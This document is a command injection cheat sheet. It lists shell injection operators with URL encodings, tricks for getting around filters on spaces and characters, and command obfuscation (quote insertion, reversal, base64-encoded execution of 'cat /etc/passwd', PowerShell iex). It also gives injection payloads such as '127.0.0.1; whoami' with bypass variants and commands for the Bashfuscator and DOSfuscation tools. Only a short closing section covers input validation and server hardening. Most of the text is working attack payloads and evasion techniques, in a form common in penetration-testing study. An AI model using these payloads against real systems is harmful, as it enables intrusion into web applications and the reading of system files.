# Command Injection Cheat Sheet

## Command Injection Operators

| Operator | Symbol | URL-Encoded | Description |
|----------|---------|-------------|-------------|
| Semicolon | `;` | `%3b` | Executes both commands |
| New Line | `\n` | `%0a` | Executes both commands |
| Background | `&` | `%26` | Executes both (second output shown first) |
| Pipe | `\|` | `%7c` | Executes both (only second output shown) |
| AND | `&&` | `%26%26` | Second executes only if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second executes only if first fails |
| Sub-Shell | `` ` ` `` | `%60%60` | Executes both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Executes both (Linux-only) |

## Space Character Bypasses

| Method | Example | Description |
|---------|---------|-------------|
| Tab | `%09` | Use tab instead of space |
| IFS Variable | `${IFS}` | Linux environment variable |
| Brace Expansion | `{ls,-la}` | Bash feature that adds spaces |

## Character Generation Techniques

### Linux Environment Variables
```bash
# Generate slash character
${PATH:0:1}           # Extracts first character from PATH

# Generate semicolon
${LS_COLORS:10:1}     # Extracts semicolon from LS_COLORS
```

### Windows Environment Variables
```cmd
# Generate backslash (CMD)
%HOMEPATH:~6,-11%

# Generate backslash (PowerShell)
$env:HOMEPATH[0]
```

### Character Shifting
```bash
# Shift ASCII character by 1
echo $(tr '!-}' '"-~'<<<[)  # Produces backslash
```

## Command Obfuscation Techniques

### Quote Insertion
```bash
# Single quotes
w'h'o'am'i

# Double quotes
w"h"o"am"i
```

### Linux-Specific Characters
```bash
# Backslash insertion
w\ho\am\i

# Positional parameter
who$@ami
```

### Windows-Specific Characters
```cmd
# Caret insertion
who^ami
```

### Case Manipulation
```bash
# Linux case conversion
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Alternative Linux method
$(a="WhOaMi";printf %s "${a,,}")
```

```powershell
# Windows (case-insensitive)
WhOaMi
```

### Reversed Commands
```bash
# Linux
echo 'whoami' | rev                    # Get reversed string
$(rev<<<'imaohw')                      # Execute reversed command
```

```powershell
# Windows
"whoami"[-1..-20] -join ''             # Reverse string
iex "$('imaohw'[-1..-20] -join '')"    # Execute reversed
```

### Base64 Encoding
```bash
# Linux encoding
echo -n 'cat /etc/passwd' | base64

# Linux execution
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

```powershell
# Windows encoding
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Windows execution
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

## Detection Payloads

### Basic Tests
```bash
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
```

### Filter Bypass Examples
```bash
# Using newline and tab
127.0.0.1%0a%09whoami

# Using IFS variable
127.0.0.1%0a${IFS}whoami

# Using environment variable for semicolon
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

## Automated Tools

### Bashfuscator (Linux)
```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### DOSfuscation (Windows)
```powershell
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
SET COMMAND <your_command>
encoding
```

## Prevention Methods

### Input Validation (PHP)
```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // proceed
} else {
    // deny
}
```

### Input Sanitization (PHP)
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

### Input Sanitization (JavaScript)
```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

## Server Hardening

- Use Web Application Firewalls (WAF)
- Run web server as low-privilege user (www-data)
- Disable dangerous functions (disable_functions=system,exec,...)
- Limit scope with open_basedir
- Reject double-encoded requests and non-ASCII URLs
